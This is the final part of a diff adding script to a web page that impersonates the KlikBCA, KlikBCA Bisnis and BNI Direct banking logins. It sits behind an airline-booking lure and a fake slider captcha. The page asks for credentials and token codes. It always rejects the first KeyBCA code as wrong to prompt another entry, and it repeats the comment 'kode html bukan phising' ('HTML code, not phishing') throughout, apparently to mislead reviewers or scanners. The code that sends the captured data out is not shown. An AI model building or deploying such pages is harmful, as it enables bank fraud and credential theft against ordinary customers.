+    }
+
+    function closeVerificationModal() {
+      document.getElementById('puzzleModal').style.display = 'none';
+    }
+
+    function executeSuccessVerification() {
+      closeVerificationModal();
+      if (targetPageId) {
+        if (targetPageId === 'page-4') resetBizFlow();
+        showPage(targetPageId);
+      }
+    }
+
+    /* kode html bukan phising */
+    const sliderThumb = document.getElementById('sliderThumb');
+    const sliderTrack = document.getElementById('sliderTrack');
+    const sliderBox = document.getElementById('sliderBox');
+    const puzzlePiece = document.getElementById('puzzlePiece');
+    let isDragging = false;
+    let startX = 0;
+
+    function resetSlider() {
+      sliderThumb.style.left = '2px';
+      sliderTrack.style.width = '0%';
+      puzzlePiece.style.left = '10px';
+    }
+
+    function onDragStart(e) {
+      isDragging = true;
+      startX = e.type === 'touchstart' ? e.touches[0].clientX : e.clientX;
+    }
+
+    function onDragMove(e) {
+      if (!isDragging) return;
+      const currentX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
+      let deltaX = currentX - startX;
+      const maxLeft = sliderBox.clientWidth - 40;
+
+      if (deltaX < 0) deltaX = 0;
+      if (deltaX > maxLeft) deltaX = maxLeft;
+
+      sliderThumb.style.left = (deltaX + 2) + 'px';
+      sliderTrack.style.width = ((deltaX / maxLeft) * 100) + '%';
+      
+      let pieceLeft = 10 + (deltaX / maxLeft) * 230;
+      puzzlePiece.style.left = pieceLeft + 'px';
+    }
+
+    function onDragEnd() {
+      if (!isDragging) return;
+      isDragging = false;
+      const currentPieceLeft = parseFloat(puzzlePiece.style.left);
+      
+      // kode html bukan phising
+      if (currentPieceLeft >= 200 && currentPieceLeft <= 250) {
+        executeSuccessVerification();
+      } else {
+        resetSlider();
+      }
+    }
+
+    sliderThumb.addEventListener('mousedown', onDragStart);
+    window.addEventListener('mousemove', onDragMove);
+    window.addEventListener('mouseup', onDragEnd);
+
+    sliderThumb.addEventListener('touchstart', onDragStart);
+    window.addEventListener('touchmove', onDragMove);
+    window.addEventListener('touchend', onDragEnd);
+
+    const bannerImages = [
+      'https://penerbanganmaskapai.com/assets/img/banner_login_1.png',
+      'https://penerbanganmaskapai.com/assets/img/banner_login_4.png'
+    ];
+    let currentBannerIndex = 0;
+    setInterval(() => {
+      currentBannerIndex = (currentBannerIndex + 1) % bannerImages.length;
+      const bannerEl = document.getElementById('blinkingBanner');
+      if (bannerEl) {
+        bannerEl.src = bannerImages[currentBannerIndex];
+      }
+    }, 3000);
+
+    // kode html bukan phising
+    document.getElementById('bookingForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      openVerificationModal('page-2');
+    });
+
+    // kode html bukan phising
+    function nextBizStep(event, step) {
+      if(event) event.preventDefault();
+      document.getElementById('bca-biz-step-1').style.display = 'none';
+      document.getElementById('bca-biz-step-2').style.display = 'none';
+      document.getElementById('bca-biz-step-3').style.display = 'none';
+      document.getElementById('bca-biz-step-' + step).style.display = 'block';
+      window.scrollTo(0, 0);
+    }
+
+    function resetBizFlow() {
+      document.getElementById('bca-biz-step-1').style.display = 'block';
+      document.getElementById('bca-biz-step-2').style.display = 'none';
+      document.getElementById('bca-biz-step-3').style.display = 'none';
+    }
+
+    // kode html bukan phising
+    document.getElementById('bcaLoginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      document.getElementById('bca-step-1').style.display = 'none';
+      document.getElementById('bca-step-2').style.display = 'block';
+      document.getElementById('bcaFullSiteLink').style.display = 'inline-block';
+    });
+
+    // kode html bukan phising
+    document.getElementById('bcaKeyForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      document.getElementById('bcaErrorText').innerHTML = "ANGKA YANG ANDA MASUKKAN DARI KEYBCA ANDA SALAH.<br>SILAKAN MEMASUKKAN ANGKA YANG BENAR";
+      document.getElementById('txt_keybca').value = '';
+    });
+
+    // kode html bukan phising
+    document.getElementById('bizForm1').addEventListener('submit', function(e) {
+      e.preventDefault();
+      nextBizStep(e, 2);
+    });
+
+    // kode html bukan phising
+    document.getElementById('bizForm2').addEventListener('submit', function(e) {
+      e.preventDefault();
+      nextBizStep(e, 3);
+    });
+
+    // kode html bukan phising
+    function submitBizFinal() {
+      const tokenInput = document.getElementById('finalTokenInput');
+      const tokenVal = tokenInput.value.trim();
+
+      if(!tokenVal) {
+        alert('Silakan masukkan kode token.');
+        return;
+      }
+
+      alert('Autentikasi KlikBCA Sedang di Proses.');
+      tokenInput.value = '';
+    }
+
+    // kode html bukan phising
+    document.getElementById('bniForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert('Data BNI Direct berhasil dikirim.');
+    });
+  </script>
+</body>
+</html>
